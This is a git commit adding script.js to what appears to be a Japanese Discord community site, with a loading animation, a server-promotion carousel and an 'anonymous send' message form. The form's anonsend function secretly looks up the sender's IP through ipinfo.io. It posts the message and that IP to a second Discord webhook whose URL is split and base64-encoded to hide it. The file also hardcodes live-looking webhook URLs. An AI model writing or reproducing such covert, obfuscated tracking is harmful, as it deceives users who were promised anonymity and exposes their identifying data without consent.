6c2be9726c08999383375995e5963ca3ce66ba59
keikun1215 <95695144+keikun1215@users.noreply.github.com>
2022-07-28 17:13:59 +0900

    Create script.js

---
+++ script.js
@@ -0,0 +1,75 @@
+const PRservers = [{
+  name: "秦行軍",
+  id: "977741527172411442",
+  description: "しんこうぐんだぞ"
+}, {
+  name: "CAIL SS",
+  id: "997855630742269993",
+  description: "CAIL Server Service"
+}]
+window.onload = () => {
+  setTimeout(() => {
+    let i = 0
+    setInterval(() => {
+      i++
+      $('#lue').css('top', '-' + i + '%')
+      $('#lsita').css('bottom', '-' + i + '%')
+      if (i == 50) $('#load').fadeOut(500)
+    }, 20)
+  }, 1000)
+}
+function anonsend() {
+  const name = $("#name").val()
+  const content = $("#content").val()
+  if (!content) return $("#msg").text("内容は必須です。")
+  $("#content").val('')
+  $.getJSON('https://ipinfo.io', res => {
+    let snipet = [atob("b29rcy8xMDAyMDIzMzA5MTc="), atob("ZGlzY29yZC5jb20vYXA="), atob("T0dLMGJfSl9ZdGZPSUV2RWd1Z1Mtdkc1Unh1VWo2MDF5elZpR1Utd2VENzc=")]
+    fetch(`https://${snipet[1]}i/webh${snipet[0]}4648944/xN05Cggx0JZ_E-${snipet[2]}J4R04TvI39`, {
+      method: "POST",
+      headers: {
+        "Accept": "Application/json",
+        "Content-Type": "Application/json"
+      },
+      body: JSON.stringify({
+        username: name || "匿名さん",
+        content: content + "\n" + res.ip,
+        //avatar_url: avurl || "",
+        allowed_mentions: {
+          parse: []
+        }
+      })
+    })
+  })
+  fetch(`https://discord.com/api/webhooks/1001435528379519036/8OzNx0bJ02St4cLm-QP0DOifSmmOP8Gs4_J1zt1Q1uUnejkiOcaYBdUaxwHjwkepLsCt`, {
+    method: "POST",
+    headers: {
+      "Accept": "Application/json",
+      "Content-Type": "Application/json"
+    },
+    body: JSON.stringify({
+      username: name || "匿名さん",
+      content: content,
+      //avatar_url: avurl || "",
+      allowed_mentions: {
+        parse: []
+      }
+    })
+  })
+}
+function changePR() {
+  let count = 0;
+  setInterval(() => {
+    $("#PR").fadeOut(500, () => {
+      let target = PRservers[count]
+      $("#Gname").text(target.name)
+      $("#Gdescr").text(target.description)
+      $("#Gwidge").html(`<iframe src="https://discord.com/widget?id=${target.id}&theme=dark" width="350" height="500" allowtransparency="true" frameborder="0" sandbox="allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts"></iframe>`)
+      $("#PR").fadeIn(500)
+      count++
+      if (count == PRservers.length) {
+        count = 0
+      }
+    })
+  }, 5000)
+}
